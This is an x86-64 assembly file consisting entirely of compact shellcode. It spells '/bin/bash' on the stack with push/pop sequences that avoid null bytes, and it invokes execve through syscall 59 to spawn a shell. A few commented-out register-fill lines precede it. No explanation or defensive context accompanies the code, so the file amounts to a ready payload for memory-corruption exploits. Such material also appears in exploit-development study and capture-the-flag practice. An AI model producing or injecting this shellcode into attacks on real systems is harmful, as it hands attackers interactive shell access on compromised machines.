.code64
.globl _start
.section .text

_start:
	#movq	$0xcccccccccccccccc, %rax
	#movq	$0xcccccccccccccccc, %rbx
	#movq	$0xcccccccccccccccc, %rcx
	#movq	$0xcccccccccccccccc, %rdx
	#movq	$0xcccccccccccccccc, %rsi
	#movq	$0xcccccccccccccccc, %rdi
	#movq	$0xcccccccccccccccc, %rbp

	pushq	$59
	popq	%rax							# rax = 59
	cltd									# rdx = 0
	pushq	$0x68							# h
	movq	$0x7361622f6e69622f, %rdi		# /bin/bas
	pushq	%rdi
	pushq	%rsp
	popq	%rdi							# rdi(argv[0]) = "/bin/bash"
	pushq	%rdx							# null pointer
	pushq	%rsp
	popq	%rdx							# rdx(envp) = {NULL}
	pushq	%rdi							# "/bin/bash"
	pushq	%rsp
	popq	%rsi							# rsi(argv) = {"/bin/bash", NULL}
	syscall									# execve("/bin/bash", ["/bin/bash", NULL], [NULL])
